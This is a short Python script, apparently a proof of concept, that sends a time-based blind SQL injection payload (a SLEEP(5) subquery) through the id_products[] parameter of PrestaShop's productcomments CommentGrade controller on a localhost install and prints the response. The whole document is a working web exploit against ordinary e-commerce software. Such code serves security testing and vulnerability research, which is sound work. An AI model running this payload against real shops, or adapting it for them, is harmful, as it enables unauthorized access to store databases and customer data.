import sys
import requests
import time

def funcionPrincipal():
    r =  requests.get("http://localhost/prestashop_si/index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(5)))xoOt)")
    print(r.content)

if __name__ == "__main__":
    funcionPrincipal()